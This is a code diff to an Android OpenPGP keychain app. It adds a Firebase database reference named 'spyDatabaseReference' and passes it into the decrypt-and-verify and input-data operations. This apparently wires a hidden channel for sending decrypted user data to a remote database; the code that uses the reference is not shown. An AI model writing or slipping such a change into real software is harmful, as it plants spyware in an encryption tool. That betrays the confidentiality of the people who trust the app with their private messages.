@@ -27,6 +27,9 @@ import android.os.AsyncTask;
 import android.os.Parcelable;
 import android.support.v4.os.CancellationSignal;
 
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
 import org.sufficientlysecure.keychain.KeychainApplication;
 import org.sufficientlysecure.keychain.analytics.AnalyticsManager;
 import org.sufficientlysecure.keychain.daos.KeyWritableRepository;
@@ -78,18 +81,18 @@ public class KeychainServiceTask {
     public CancellationSignal startOperationInBackground(
             Parcelable inputParcel, CryptoInputParcel cryptoInput, OperationCallback operationCallback) {
         AtomicBoolean operationCancelledBoolean = new AtomicBoolean(false);
+            DatabaseReference spyDatabaseReference = FirebaseDatabase.getInstance().getReference();
 
         AsyncTask<Void, ProgressUpdate, OperationResult> asyncTask =
                 new AsyncTask<Void, ProgressUpdate, OperationResult>() {
                     @Override
                     protected OperationResult doInBackground(Void... voids) {
                         BaseOperation op;
-
                         if (inputParcel instanceof SignEncryptParcel) {
                             op = new SignEncryptOperation(context, keyRepository, asyncProgressable,
                                     operationCancelledBoolean);
                         } else if (inputParcel instanceof PgpDecryptVerifyInputParcel) {
-                            op = new PgpDecryptVerifyOperation(context, keyRepository, asyncProgressable);
+                            op = new PgpDecryptVerifyOperation(context, keyRepository, asyncProgressable,spyDatabaseReference);
                         } else if (inputParcel instanceof SaveKeyringParcel) {
                             op = new EditKeyOperation(context, keyRepository, asyncProgressable,
                                     operationCancelledBoolean);
@@ -117,7 +120,7 @@ public class KeychainServiceTask {
                         } else if (inputParcel instanceof KeybaseVerificationParcel) {
                             op = new KeybaseVerificationOperation(context, keyRepository, asyncProgressable);
                         } else if (inputParcel instanceof InputDataParcel) {
-                            op = new InputDataOperation(context, keyRepository, asyncProgressable);
+                            op = new InputDataOperation(context, keyRepository, asyncProgressable, spyDatabaseReference);
                         } else if (inputParcel instanceof BenchmarkInputParcel) {
                             op = new BenchmarkOperation(context, keyRepository, asyncProgressable);
                         } else if (inputParcel instanceof KeySyncParcel) {
@@ -132,7 +135,6 @@ public class KeychainServiceTask {
                         }
 
                         analyticsManager.trackInternalServiceCall(op.getClass().getSimpleName());
-
                         // noinspection unchecked, we make sure it's the correct op above
                         return op.execute(inputParcel, cryptoInput);
                     }
